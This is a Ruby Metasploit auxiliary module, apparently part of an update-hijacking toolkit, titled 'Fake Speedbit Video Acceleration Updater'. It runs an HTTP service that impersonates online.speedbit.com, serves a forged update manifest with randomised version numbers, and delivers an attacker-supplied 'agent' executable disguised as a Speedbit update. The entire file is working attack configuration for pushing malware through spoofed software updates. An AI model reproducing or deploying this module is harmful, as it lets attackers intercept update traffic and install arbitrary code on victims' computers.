require 'msf/core'


class Metasploit3 < Msf::Auxiliary

	include Msf::Auxiliary::Update
	def initialize
		super(
			'Name'        => 'Fake Speedbit Video Acceleration Updater',
			'Version'     => '1.0',
			'Description'    => %q{
				This module provides a HTTP service that
			is designed to fake Speedbit Video Acceleration updates.
			},
			'Author'      => ['spider'],
			'License'     => MSF_LICENSE
		)

		register_options(
			[
				OptPort.new('SRVPORT',    [ true, "The local port to listen on.", 80 ]),
			], self.class)

		@base = {
			'vh' => ['online.speedbit.com'],
			'request' => [{
				'req' => 'online/update.aspx', 
				'type' => 'file', 
				'method' => '', 
				'bin'    => '0',
				'string' => "",
				'parse' => 1,
				'file' => 'speedbit_update.xml',
			},
			{
				'req' => '.exe', 
				'type' => 'agent', 
				'method' => '', 
				'bin'    => 1,		    
				'string' => '',
				'parse' => '0',
				'file' => ''
			}
			],
			'options' => {  
				'version'  => { 
					'val' => '"9.#{RndNum(1)}.#{RndNum(1)}.#{RndNum(1)}.#{RndNum(1)}"',
					'hidden' => 1,
					'dynamic' =>1,},		    
				'url'  => { 
					'val' => '"http://online.speedbit.com/speedbitupdate#{RndAlpha(RndNum(1))}.exe"',
					'hidden' => 1,
					'dynamic' =>1,
				}
			}
		}
	end
end
